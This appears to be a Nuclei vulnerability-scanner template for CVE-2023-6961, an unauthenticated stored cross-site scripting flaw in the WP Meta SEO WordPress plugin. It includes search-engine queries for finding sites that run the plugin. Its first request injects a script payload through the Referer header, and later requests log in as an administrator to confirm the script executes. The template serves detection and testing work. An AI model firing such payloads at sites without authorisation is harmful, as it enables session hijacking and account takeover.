id: CVE-2023-6961

info:
  name: WP Meta SEO <= 4.5.12 - Unauthenticated Stored Cross-Site Scripting
  author: Sourabh-Sahu
  severity: high
  description: |
    The WP Meta SEO plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the ‘Referer’ header in all versions up to, and including, 4.5.12 due to insufficient input sanitization and output escaping. This makes it possible for unauthenticated attackers to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page.
  impact: |
    Attackers can execute malicious scripts in victim browsers, leading to session hijacking, account takeover, or unauthorized administrative actions.
  remediation: |
    Update the WP Meta SEO plugin to the latest version where this issue has been fixed.
  reference:
    - https://nvd.nist.gov/vuln/detail/cve-2023-6961
    - https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/wp-meta-seo/wp-meta-seo-4512-unauthenticated-stored-cross-site-scripting-via-referer-header
    - https://www.fastly.com/blog/active-exploitation-unauthenticated-stored-xss-vulnerabilities-wordpress
    - https://plugins.trac.wordpress.org/changeset?sfp_email=&sfph_mail=&reponame=&new=3071453%40wp-meta-seo%2Ftrunk&old=3068145%40wp-meta-seo%2Ftrunk&sfp_email=&sfph_mail=
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 7.2
    cve-id: CVE-2023-6961
    cwe-id: CWE-79
    cpe: cpe:2.3:a:joomunited:wp_meta_seo:*:*:*:*:*:wordpress:*:*
  metadata:
    verified: true
    max-request: 4
    vendor: joomunited
    product: WP Meta SEO
    shodan-query:
      - http.html:"/wp-content/plugins/wp-meta-seo/"
    fofa-query: body=/wp-content/plugins/wp-meta-seo/
    google-query: inurl:"/wp-content/plugins/wp-meta-seo/"
  tags: cve,cve2023,wordpress,wp-plugin,xss,stored,meta-seo,unathenticated

variables:
  abc: "{{rand_base(5)}}"

flow: http(1) && http(2) && http(3) && http(4)

http:
  - raw:
      - |
        GET /{{abc}} HTTP/1.1
        Host: {{Hostname}}
        Referer: "><script>alert(1)</script>

    matchers:
      - type: dsl
        dsl:
          - status_code == 404
        internal: true

  - raw:
      - |
        GET /wp-login.php HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains(body, "loginform")
        condition: and
        internal: true

  - raw:
      - |
        POST /wp-login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Cookie: wordpress_test_cookie=WP%20Cookie%20check

        log={{username}}&pwd={{password}}&wp-submit=Log+In&redirect_to={{RootURL}}/wp-admin/&testcookie=1

    matchers:
      - type: dsl
        dsl:
          - status_code == 302
          - contains(header, "wordpress_logged_in")
        condition: and
        internal: true

  - raw:
      - |
        GET /wp-admin/admin.php?page=metaseo_broken_link HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains_all(body, "><script>alert(1)</script>")
        condition: and
